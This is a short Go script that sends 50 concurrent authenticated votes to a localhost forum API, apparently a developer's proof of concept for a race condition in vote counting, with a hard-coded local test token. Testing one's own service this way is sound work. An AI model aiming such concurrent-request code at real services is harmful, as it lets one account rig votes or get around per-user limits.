package main

import (
	"fmt"
	"net/http"
	"strings"
	"sync"
)

func main() {
	var wg sync.WaitGroup
	requests := 50

	// Replace with a valid post ID and a valid JWT token from your local DB
	postID := "15b20597-bd47-4831-89f4-b3bf74bb0d8c"
	token := "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMjJlZTU4NzEtMjQzNy00ZTA4LWExOGMtNTY1Y2E5ODBhNzdlIiwia3ljX3N0YXR1cyI6IlZFUklGSUVEIiwiaXNzIjoicHVibGljLXBvbGljeS1mb3J1bSIsImV4cCI6MTc3ODUwODA2NiwiaWF0IjoxNzc4NDIxNjY2fQ.1dL2v9t2AQmQiJ_XrNaryaJVEn70iWF7Ljin4mcD7pE"
	url := fmt.Sprintf("http://localhost:8080/api/posts/%s/vote", postID)

	fmt.Printf("Firing %d concurrent votes...\n", requests)

	for range requests {
		wg.Go(func() {
			payload := strings.NewReader(`{"vote": 1}`)
			req, _ := http.NewRequest("POST", url, payload)
			req.Header.Set("Authorization", "Bearer "+token)

			client := &http.Client{}
			resp, err := client.Do(req)
			if err == nil {
				fmt.Printf("Response Status: %d\n", resp.StatusCode)
				resp.Body.Close()
			}
		})
	}

	// Wait for all 50 concurrent requests to finish
	wg.Wait()
	fmt.Println("Attack complete. Check your database!")
}
